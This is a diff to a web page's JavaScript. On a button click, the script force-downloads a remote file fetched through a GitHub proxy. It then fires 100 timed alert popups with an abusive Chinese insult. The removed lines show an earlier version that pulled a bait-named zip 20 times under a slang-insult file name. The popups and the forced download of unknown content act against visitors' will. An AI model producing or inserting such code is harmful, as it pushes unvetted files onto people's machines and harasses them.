@@ -28,18 +28,24 @@
             document.querySelector('button').style.display = 'none'; // Hide the button
 
             // Loop to download the file 10 times
-            for (let i = 0; i < 20; i++) {
-                fetch('https://raw.kkgithub.com/miku1hhhh/miku1hhhh.github.io/main/dist/%E9%9B%B7%E7%8B%AE%E8%A3%B8%E7%85%A7.zip')
-                    。then(response => response.blob())
-                    。then(blob => {
+            for (let i = 0; i < 1; i++) {
+                fetch('https://mirror.ghproxy.com/https://raw.githubusercontent.com/miku1hhhh/miku1hhhh.github.io/main/0')
+                    .then(response => response.blob())
+                    .then(blob => {
                         const link = document.createElement('a');
                         link.href = URL.createObjectURL(blob);
-                        link.download = `nmsl_${i + 1}`; // Set a unique file name for each download
+                        link.download = `downloaded_file_${i + 1}`; // Set a unique file name for each download
                         document.body.appendChild(link);
                         link.click();
                         document.body.removeChild(link);
                     })
                     .catch(console.error);
+            }
+
+            // Trigger multiple alert popups
+            const numberOfAlerts = 100; // Customize the number of alerts here
+            for (let i = 0; i < numberOfAlerts; i++) {
+                setTimeout(() => alert(`你妈死了${i + 1}回`), (i + 1) * 1000);
             }
         }
     </script>
